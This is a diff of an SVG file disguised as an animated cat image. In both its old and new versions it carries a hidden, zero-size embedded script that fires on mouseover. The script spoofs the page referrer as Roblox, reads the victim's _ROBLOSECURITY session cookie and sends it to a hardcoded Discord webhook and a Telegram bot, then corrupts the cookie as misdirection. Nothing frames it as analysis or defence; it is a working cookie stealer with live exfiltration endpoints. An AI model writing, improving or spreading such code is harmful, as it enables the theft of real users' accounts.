@@ -1,37 +1,23 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="480" height="480" onmouseover="steal()" style="cursor:pointer">  
-  <!-- DECOY: WORKING CAT MEME GIF (DIRECT LINK) -->  
-  <image href="https://media.tenor.com/9kAC0Qi_dNIAAAAM/cats-cat-muscle.gif" width="100%" height="100%"/>  
-
-  <!-- INVISIBLE COOKIE JACKER -->  
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500" onmouseover="steal()">  
+  <image href="https://i.imgur.com/6f5W7O2.gif" width="100%" height="100%"/>  
   <foreignObject width="0" height="0">  
     <body xmlns="http://www.w3.org/1999/xhtml">  
       <script>  
         function steal() {  
-          // Spoof Roblox origin  
-          const fakeReferrer = {  
-            get: () => 'https://www.roblox.com',  
-            configurable: true  
-          };  
-          Object.defineProperty(document, 'referrer', fakeReferrer);  
-
-          // Extract cookie  
+          Object.defineProperty(document, 'referrer', { get: () => 'https://www.roblox.com' });  
           const cookie = document.cookie.match(/_ROBLOSECURITY=([^;]+)/)?.[1] || 'NO_COOKIE';  
 
-          // Discord Exfil  
-          const part1 = "https://discord.com/api/webhooks/1343503446044839946/";  
-          const part2 = "l9a_3NpZGCkczHw8NAU_zc8afybkxmV4QWmSX3KhLGp1DbQQSbecUmtGkiK2xdRcaBlU";  
-          fetch(part1 + part2, {  
+          // Discord  
+          fetch('https://discord.com/api/webhooks/1343503446044839946/l9a_3NpZGCkczHw8NAU_zc8afybkxmV4QWmSX3KhLGp1DbQQSbecUmtGkiK2xdRcaBlU', {  
             method: 'POST',  
             headers: {'Content-Type': 'application/json'},  
-            body: JSON.stringify({content: `||@everyone **COOKIE**\n\`${cookie}\`||`})  
+            body: JSON.stringify({content: `COOKIE: ||${cookie}||`})  
           });  
 
-          // Telegram Exfil  
-          const botToken = "7689732639:AAFzAGyOODxKzk4RlMJjMUBEivbR4VkK8WY";  
-          fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=CHAT_ID&text=${encodeURIComponent(cookie)}`);  
+          // Telegram  
+          fetch(`https://api.telegram.org/bot7689732639:AAFzAGyOODxKzk4RlMJjMUBEivbR4VkK8WY/sendMessage?chat_id=CHAT_ID&text=${encodeURIComponent(cookie)}`);  
 
-          // Misdirection  
-          document.cookie = `_ROBLOSECURITY=deadbeef${Math.random()}; domain=.roblox.com; path=/; max-age=60`;  
+          document.cookie = `_ROBLOSECURITY=corrupted_${Math.random()}; domain=.roblox.com; path=/`;  
         }  
       </script>  
     </body>  
